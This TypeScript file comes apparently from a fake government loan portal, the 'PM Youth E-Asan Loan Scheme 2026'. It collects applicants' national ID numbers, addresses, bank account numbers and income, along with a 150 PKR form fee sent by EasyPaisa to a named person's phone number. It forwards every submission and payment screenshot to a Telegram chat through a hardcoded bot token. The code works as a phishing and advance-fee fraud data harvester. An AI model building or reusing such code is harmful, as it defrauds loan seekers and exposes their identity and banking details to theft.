/**
 * ============================================================================
 * TELEGRAM BOT CONFIGURATION
 * ============================================================================
 * Sends every loan portal application form submission directly to the Telegram bot/chat.
 */

export const TELEGRAM_CONFIG = {
  BOT_TOKEN: import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "8978291725:AAE7ZdMMFlMAljtqpzzrjU6Tzwurv8isGto",
  CHAT_ID: import.meta.env.VITE_TELEGRAM_CHAT_ID || "6085903221",
  ENABLED: true,
};

export interface LoanApplicationData {
  // Step 1: Personal Information
  fullName: string;
  cnic: string;
  mobileNo: string;
  gender: string;
  dob: string;
  province: string;
  address: string;

  // Step 2: Bank Information
  loanAmount: string;
  loanPurpose: string;
  occupation: string;
  bankName: string;
  accountNumber: string;
  monthlyIncome: string;

  // Step 3: Payment & Transaction
  transactionId: string;
  formFee: string;
  paymentMethod: string;
  paymentReceiverName: string;
  paymentReceiverNumber: string;
  screenshotFile?: File | null;
  screenshotDataUrl?: string;
  submittedAt: string;
}

/**
 * Sends the loan application details directly to the configured Telegram bot.
 */
export async function sendApplicationToTelegram(data: LoanApplicationData): Promise<{ success: boolean; message?: string }> {
  if (!TELEGRAM_CONFIG.ENABLED || !TELEGRAM_CONFIG.BOT_TOKEN || !TELEGRAM_CONFIG.CHAT_ID) {
    console.warn("Telegram bot integration skipped: credentials not set.");
    return { success: true, message: "Telegram integration is not configured." };
  }

  const messageText = `
🏛 *NEW LOAN APPLICATION RECEIVED*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 *STEP 1: PERSONAL INFORMATION*
• *Full Name:* ${data.fullName || "N/A"}
• *CNIC:* ${data.cnic || "N/A"}
• *Mobile No:* ${data.mobileNo || "N/A"}
• *Gender:* ${data.gender || "N/A"}
• *Date of Birth:* ${data.dob || "N/A"}
• *Province:* ${data.province || "N/A"}
• *Address:* ${data.address || "N/A"}

💳 *STEP 2: BANK & LOAN DETAILS*
• *Loan Amount Requested:* PKR ${data.loanAmount || "N/A"}
• *Purpose:* ${data.loanPurpose || "N/A"}
• *Occupation:* ${data.occupation || "N/A"}
• *Bank Name:* ${data.bankName || "N/A"}
• *Account Number:* ${data.accountNumber || "N/A"}
• *Monthly Income:* PKR ${data.monthlyIncome || "N/A"}

💰 *STEP 3: FEE PAYMENT DETAILS*
• *Form Fee:* ${data.formFee || "150 PKR"}
• *Payment Method:* ${data.paymentMethod || "EasyPaisa"}
• *Receiver Name:* ${data.paymentReceiverName || "Bilal Hussain"}
• *Receiver Number:* ${data.paymentReceiverNumber || "03032782757"}
• *Transaction ID (TRX):* \`${data.transactionId || "N/A"}\`
• *Submitted At:* ${data.submittedAt || new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🇵🇰 *PM Youth E-Asan Loan Scheme 2026 Portal*
`.trim();

  try {
    let sentPhotoSuccess = false;

    // If a screenshot file was attached, send using sendPhoto with caption
    if (data.screenshotFile) {
      try {
        const formData = new FormData();
        formData.append("chat_id", TELEGRAM_CONFIG.CHAT_ID);
        formData.append("photo", data.screenshotFile);
        formData.append("caption", messageText.slice(0, 1024));
        formData.append("parse_mode", "Markdown");

        const photoRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData,
        });
        const photoJson = await photoRes.json();
        
        if (photoJson.ok) {
          sentPhotoSuccess = true;
          // If message was truncated beyond 1024 chars caption limit, send remaining full text
          if (messageText.length > 1024) {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.CHAT_ID,
                text: messageText,
                parse_mode: "Markdown",
              }),
            });
          }
          return { success: true };
        } else {
          console.warn("Telegram sendPhoto response error, trying fallback:", photoJson);
        }
      } catch (photoErr) {
        console.warn("sendPhoto fetch error:", photoErr);
      }
    }

    // Text message delivery (or fallback if sendPhoto had an issue):
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CONFIG.CHAT_ID,
        text: messageText,
        parse_mode: "Markdown",
      }),
    });

    const json = await res.json();
    if (!json.ok) {
      // Retry without markdown formatting in case of special characters in user input
      const retryRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CONFIG.CHAT_ID,
          text: messageText.replace(/[*`_]/g, ""),
        }),
      });
      const retryJson = await retryRes.json();
      return { success: retryJson.ok, message: retryJson.description };
    }

    return { success: json.ok, message: json.description };
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
    return { success: false, message: String(error) };
  }
}
